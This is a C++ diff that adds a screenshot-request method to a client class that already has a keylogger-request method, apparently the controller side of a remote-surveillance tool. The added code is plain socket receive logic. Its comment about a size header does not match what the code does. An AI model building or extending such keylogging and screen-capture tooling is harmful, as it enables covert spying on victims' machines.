@@ -100,6 +100,38 @@ bool  Client::sendKeyloggerRequest(){
         Sleep(10); 
     }
     outFile.close();
+}
    
+bool Client::sendScreenshotRequest()
+{
+    // Step 1: Send a request to the server for a screenshot
+    const char* requestMessage = "screenshot";
+    int sendResult = send(clientSocket, requestMessage, strlen(requestMessage), 0);
+    if (sendResult == SOCKET_ERROR) {
+        std::cerr << "Send failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+
+    // Step 2: Receive the screenshot data
+    char buffer[1024]; // Adjust size as necessary
+    std::ofstream outFile("received_screenshot.png", std::ios::binary);
+    if (!outFile) {
+        std::cerr << "Error opening file for writing." << std::endl;
+        return false;
+    }
+
+    // Assume the server sends the size first
+    int bytesReceived;
+    while ((bytesReceived = recv(clientSocket, buffer, sizeof(buffer), 0)) > 0) {
+        outFile.write(buffer, bytesReceived); // Write the received data to the file
+    }
+
+    if (bytesReceived < 0) {
+        std::cerr << "Receive failed: " << WSAGetLastError() << std::endl;
+        return false;
+    }
+
+    outFile.close();
+    std::cout << "Screenshot received and saved as received_screenshot.png" << std::endl;
     return true;
 }
